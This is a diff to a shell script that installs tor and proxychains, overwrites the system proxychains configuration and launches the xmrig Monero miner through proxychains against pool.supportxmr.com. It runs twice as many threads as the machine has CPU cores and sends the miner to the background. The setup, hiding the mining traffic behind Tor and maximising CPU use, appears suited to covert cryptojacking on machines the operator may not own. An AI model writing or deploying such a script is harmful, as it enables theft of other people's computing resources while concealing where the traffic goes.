@@ -10,14 +10,19 @@ POOL=pool.supportxmr.com:5555
 thread=$(grep ^cpu\\scores /proc/cpuinfo | uniq |  awk '{print $4}')
 run_thread=$((thread * 2))
 
-apt install tor proxychains
+echo "PROXYCHAINS START"
+apt install tor proxychains -y
 systemctl start tor
 
 rm -f /etc/proxychains.conf
 cp proxychains.conf /etc
 
+cat /etc/proxychains.conf
+
 curl ipinfo.io
 proxychains curl ipinfo.io
+
+echo "PROXYCHAINS STOP"
 
 proxychains ./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=testaddmore -k --coin=monero --threads $run_thread &
 
